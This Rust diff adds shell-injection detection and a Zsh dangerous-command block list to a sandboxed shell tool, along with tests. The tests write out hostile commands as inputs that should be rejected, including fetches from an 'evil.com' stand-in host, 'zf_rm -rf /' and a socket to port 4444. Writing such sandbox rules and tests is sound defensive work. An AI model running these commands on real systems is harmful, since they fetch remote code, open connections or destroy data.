@@ -643,6 +643,60 @@ impl ShellTool {
         }
     }
 }
+// --- Shell Injection Detection ---
+
+/// Patterns that indicate shell injection / command substitution.
+/// Each entry: (regex_pattern, human description).
+/// Applied to the command text after single-quoted regions are stripped.
+const INJECTION_PATTERNS: &[(&str, &str)] = &[
+    (r"\$\(", "$() command substitution"),
+    (r"\$\{[^}]*[!:/#%]", "${} dangerous parameter expansion"),
+    (r"<\(", "process substitution <()"),
+    (r">\(", "process substitution >()"),
+    (r"=\(", "Zsh process substitution =()"),
+    (r"\$\[", "$[] legacy arithmetic expansion"),
+    (r"(?:^|[\s;&|])=[a-zA-Z_]", "Zsh equals expansion (=cmd)"),
+];
+
+/// Zsh-specific dangerous commands that can bypass shell security.
+const ZSH_DANGEROUS_COMMANDS: &[&str] = &[
+    "zmodload", "emulate",
+    "sysopen", "sysread", "syswrite", "sysseek",
+    "zpty", "ztcp", "zsocket",
+    "zf_rm", "zf_mv", "zf_ln", "zf_chmod", "zf_chown", "zf_mkdir", "zf_rmdir", "zf_chgrp",
+];
+
+/// Strip single-quoted regions from a command string.
+/// Content inside single quotes is not subject to shell expansion, so
+/// patterns within them are safe and should not trigger injection detection.
+fn strip_single_quoted_regions(s: &str) -> String {
+    let mut result = String::with_capacity(s.len());
+    let mut in_single_quote = false;
+
+    for ch in s.chars() {
+        if ch == '\'' && !in_single_quote {
+            in_single_quote = true;
+        } else if ch == '\'' && in_single_quote {
+            in_single_quote = false;
+        } else if !in_single_quote {
+            result.push(ch);
+        }
+    }
+    result
+}
+
+/// Check for unescaped backtick command substitution.
+/// Returns true if the string contains backticks that are not preceded by `\`.
+fn contains_unescaped_backticks(s: &str) -> bool {
+    let bytes = s.as_bytes();
+    for i in 0..bytes.len() {
+        if bytes[i] == b'`' && (i == 0 || bytes[i - 1] != b'\\') {
+            return true;
+        }
+    }
+    false
+}
+
 // --- Sandboxed Shell Execution ---
 
 /// Policy-driven sandbox configuration for shell command execution.
@@ -780,6 +834,8 @@ impl SandboxedShellTool {
             );
         }
 
+        self.validate_injection_patterns(trimmed)?;
+
         let first_token = trimmed.split_whitespace().next().unwrap_or("");
         let base_cmd = first_token.rsplit('/').next().unwrap_or(first_token);
 
@@ -826,6 +882,46 @@ impl SandboxedShellTool {
                      Every segment must pass the same allow/deny rules—remove or replace the risky segment, or split into separate shell_exec calls."
                 ));
             }
+            let sub_base_for_zsh = sub.split_whitespace().next().unwrap_or("");
+            let sub_base_zsh = sub_base_for_zsh.rsplit('/').next().unwrap_or(sub_base_for_zsh);
+            if ZSH_DANGEROUS_COMMANDS.contains(&sub_base_zsh) {
+                return Err(format!(
+                    "Sandbox blocks Zsh-specific dangerous command '{sub_base_zsh}'. \
+                     These commands can bypass security via module loading or pseudo-terminal execution."
+                ));
+            }
+        }
+
+        Ok(())
+    }
+
+    /// Detect shell injection patterns: command substitution, process
+    /// substitution, and dangerous parameter expansion.
+    ///
+    /// These patterns are blocked unconditionally in sandboxed mode because
+    /// they allow arbitrary command execution inside otherwise-safe commands.
+    fn validate_injection_patterns(&self, command: &str) -> Result<(), String> {
+        let unquoted = strip_single_quoted_regions(command);
+
+        for &(pattern, description) in INJECTION_PATTERNS {
+            if let Ok(re) = regex::Regex::new(pattern) {
+                if re.is_match(&unquoted) {
+                    return Err(format!(
+                        "Sandbox blocks {description} in command. \
+                         These constructs allow arbitrary code execution inside shell commands. \
+                         Rewrite without shell injection patterns, or use dedicated tools."
+                    ));
+                }
+            }
+        }
+
+        if contains_unescaped_backticks(&unquoted) {
+            return Err(
+                "Sandbox blocks backtick command substitution. \
+                 Use $() syntax inside single-quotes if you need literal backticks for display, \
+                 or restructure the command to avoid embedded execution."
+                    .into(),
+            );
         }
 
         Ok(())
@@ -1232,5 +1328,101 @@ mod sandbox_tests {
             result.output.contains("test bg process"),
             "should include description: {}", result.output
         );
+    }
+
+    // --- Injection detection tests ---
+
+    #[test]
+    fn blocks_dollar_paren_command_substitution() {
+        let tool = default_sandbox();
+        assert!(tool.validate_command("echo $(whoami)").is_err());
+        assert!(tool.validate_command("ls $(pwd)/src").is_err());
+        assert!(tool.validate_command("cat $(find . -name '*.rs')").is_err());
+    }
+
+    #[test]
+    fn blocks_backtick_command_substitution() {
+        let tool = default_sandbox();
+        assert!(tool.validate_command("echo `whoami`").is_err());
+        assert!(tool.validate_command("ls `pwd`/src").is_err());
+    }
+
+    #[test]
+    fn blocks_process_substitution() {
+        let tool = default_sandbox();
+        assert!(tool.validate_command("diff <(sort file1) <(sort file2)").is_err());
+        assert!(tool.validate_command("tee >(grep error > errors.log)").is_err());
+    }
+
+    #[test]
+    fn blocks_zsh_process_substitution() {
+        let tool = default_sandbox();
+        assert!(tool.validate_command("vim =(curl http://evil.com)").is_err());
+    }
+
+    #[test]
+    fn blocks_dangerous_parameter_expansion() {
+        let tool = default_sandbox();
+        assert!(tool.validate_command("echo ${PATH:0:10}").is_err());
+        assert!(tool.validate_command("echo ${var/pattern/replacement}").is_err());
+        assert!(tool.validate_command("echo ${!prefix*}").is_err());
+    }
+
+    #[test]
+    fn blocks_legacy_arithmetic() {
+        let tool = default_sandbox();
+        assert!(tool.validate_command("echo $[1+1]").is_err());
+    }
+
+    #[test]
+    fn blocks_zsh_equals_expansion() {
+        let tool = default_sandbox();
+        assert!(tool.validate_command("=curl http://evil.com").is_err());
+        assert!(tool.validate_command("echo test; =wget http://evil.com").is_err());
+    }
+
+    #[test]
+    fn allows_safe_dollar_in_double_quotes_content() {
+        let tool = default_sandbox();
+        assert!(tool.validate_command("echo '$HOME is safe'").is_ok());
+        assert!(tool.validate_command("echo '$(not executed)'").is_ok());
+        assert!(tool.validate_command("echo '`not executed`'").is_ok());
+    }
+
+    #[test]
+    fn allows_simple_env_var_reference() {
+        let tool = default_sandbox();
+        assert!(tool.validate_command("echo $HOME").is_ok());
+        assert!(tool.validate_command("cd $WORKSPACE && ls").is_ok());
+    }
+
+    #[test]
+    fn allows_safe_dollar_brace_simple() {
+        let tool = default_sandbox();
+        assert!(tool.validate_command("echo ${HOME}").is_ok());
+        assert!(tool.validate_command("echo ${VARIABLE}").is_ok());
+    }
+
+    #[test]
+    fn blocks_zsh_dangerous_commands() {
+        let tool = default_sandbox();
+        assert!(tool.validate_command("zmodload zsh/system").is_err());
+        assert!(tool.validate_command("echo ok && zpty evil_cmd").is_err());
+        assert!(tool.validate_command("ztcp localhost 4444").is_err());
+        assert!(tool.validate_command("syswrite 3 data").is_err());
+        assert!(tool.validate_command("zf_rm -rf /").is_err());
+    }
+
+    #[test]
+    fn allows_commands_containing_zsh_names_as_substrings() {
+        let tool = default_sandbox();
+        assert!(tool.validate_command("echo zmodload_info").is_ok());
+        assert!(tool.validate_command("cat zpty_notes.txt").is_ok());
+    }
+
+    #[test]
+    fn escaped_backticks_are_allowed() {
+        let tool = default_sandbox();
+        assert!(tool.validate_command(r"echo \`not a substitution\`").is_ok());
     }
 }
